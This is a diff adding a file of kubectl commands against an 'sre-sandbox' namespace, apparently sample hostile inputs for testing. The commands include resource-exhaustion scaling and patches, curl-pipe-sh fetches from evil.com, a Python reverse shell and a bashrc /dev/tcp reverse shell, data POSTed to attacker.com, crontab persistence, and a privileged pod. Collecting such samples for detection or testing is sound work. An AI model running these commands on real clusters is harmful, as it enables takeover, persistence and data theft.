@@ -1,0 +1,20 @@
+kubectl scale job heavy-job --replicas=1000 -n sre-sandbox
+kubectl scale job heavy-job --replicas=500 -n sre-sandbox
+kubectl scale deployment myapp --replicas=1000 -n sre-sandbox
+kubectl scale deployment frontend --replicas=500 backend --replicas=500 -n sre-sandbox
+kubectl patch deployment myapp -n sre-sandbox --type='json' -p='[{"op":"replace","path":"/spec/template/spec/containers/0/resources/requests/cpu","value":"5000"},{"op":"replace","path":"/spec/template/spec/containers/0/resources/limits/memory","value":"1Ti"}]'
+kubectl patch deployment myapp -n sre-sandbox --type='json' -p='[{"op":"replace","path":"/spec/template/spec/containers/0/resources/requests/cpu","value":"1000"},{"op":"replace","path":"/spec/template/spec/containers/0/resources/limits/memory","value":"500Gi"}]'
+kubectl patch deployment myapp -n sre-sandbox --type='json' -p='[{"op":"replace","path":"/spec/template/spec/containers/0/resources/limits/cpu","value":"2000"},{"op":"replace","path":"/spec/template/spec/containers/0/resources/requests/memory","value":"800Gi"}]'
+kubectl patch deployment myapp -n sre-sandbox --type='json' -p='[{"op":"replace","path":"/spec/template/spec/containers/0/resources/requests/cpu","value":"10000"},{"op":"replace","path":"/spec/template/spec/containers/0/resources/limits/cpu","value":"20000"}]'
+kubectl patch deployment myapp -n sre-sandbox -p '{"spec":{"template":{"spec":{"containers":[{"name":"myapp","command":["/tmp/evil.sh"]}]}}}}'
+kubectl patch deployment myapp -n sre-sandbox -p '{"spec":{"template":{"spec":{"containers":[{"name":"myapp","command":["/opt/scripts/back.sh"]}]}}}}'
+kubectl patch deployment myapp -n sre-sandbox -p '{"spec":{"template":{"spec":{"containers":[{"name":"myapp","command":["curl","http://website.com/myapp.sh","-o","/tmp/myapp.sh"]}]}}}}'
+kubectl patch deployment myapp -n sre-sandbox -p '{"spec":{"template":{"spec":{"containers":[{"name":"myapp","command":["sleep","3600"]}]}}}}'
+kubectl exec pod-name -n sre-sandbox -- python -c 'import os; os.system("curl http://evil.com/back.sh | sh")'
+kubectl exec pod-name -n sre-sandbox -- python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
+kubectl exec pod-name -- /usr/bin/curl http://evil.com/back.sh
+kubectl exec pod-name -- /tmp/backdoor.sh
+kubectl exec pod -n sre-sandbox -- sh -c "curl -X POST -d @- http://attacker.com/upload"
+kubectl exec pod -n sre-sandbox -- sh -c 'echo "* * * * * root curl http://evil.com/back.sh | sh" | tee -a /etc/crontab'
+kubectl exec pod -- sh -c 'echo "bash -i >& /dev/tcp/192.168.1.99/4444 0>&1" >> ~/.bashrc\',kubectl apply -f privpod.yaml -n sre-sandbox
+kubectl exec podname -n sre-sandbox -- yes > /dev/null
